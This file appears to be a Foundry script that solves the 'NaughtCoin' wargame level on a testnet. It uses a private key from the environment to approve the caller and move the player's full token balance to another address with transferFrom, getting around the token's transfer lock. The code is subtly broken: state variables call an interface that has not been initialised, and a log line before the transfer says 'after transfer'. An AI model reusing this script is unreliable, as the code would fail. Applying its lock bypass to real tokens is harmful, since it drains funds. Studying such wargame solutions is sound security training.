// SPDX-License-Identifier: UNLICENSED

// /*
pragma solidity 0.8.19;

import {Script} from "lib/forge-std/src/Script.sol";
import {console} from "lib/forge-std/src/Console.sol";

// naughtCoin contract address: 0x9E175f4a84aaf9f6d7ddD293b5A2b8E409C6f3d8
interface INaughtCoin {
    function INITIAL_SUPPLY() external returns (uint256);

    function transfer(address, uint256) external returns (bool);

    function player() external returns (address);

    function approve(address, uint256) external returns (bool);

    function transferFrom(address, address, uint256) external returns (bool);

    function balanceOf(address) external view returns (uint256);

    function allowance(
        address _owner,
        address _spender
    ) external returns (uint256 remaining);
}

contract TriggerAttack is Script {
    INaughtCoin public naughtCoin;

    address naughtAddr = 0x9E175f4a84aaf9f6d7ddD293b5A2b8E409C6f3d8;
    address receiver = 0xcAcf4d840CB5D9a80e79b02e51186a966de757d9;
    address player = naughtCoin.player();

    uint256 playerBalance;
    uint256 value = naughtCoin.balanceOf(naughtCoin.player());

    function run() external {
        uint256 privateKey = vm.envUint("PRIVATE_KEY");
        // address account = vm.addr(privateKey);

        // Instatiate the naughtCoin contract
        vm.startBroadcast(privateKey);
        naughtCoin = INaughtCoin(naughtAddr);
        vm.stopBroadcast();

        // check player balance before transfer
        vm.startBroadcast(privateKey);
        playerBalance = naughtCoin.balanceOf(player);
        vm.stopBroadcast();

        // console log player balance before transfer
        console.log("Balance after transfer: ", playerBalance);

        // Approve msg.sender aka player to transfer from player account
        // transfer the tokens from player to receiver using transferFrom
        // check player balance after transfer
        vm.startBroadcast(privateKey);
        naughtCoin.approve(msg.sender, value);

        naughtCoin.transferFrom(msg.sender, receiver, value);

        playerBalance = naughtCoin.balanceOf(player);
        vm.stopBroadcast();

        // console log player balance after transfer
        console.log("Balance after transfer: ", playerBalance);
    }
}

// forge script script/TriggerAttack.s.sol:TriggerAttack --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv
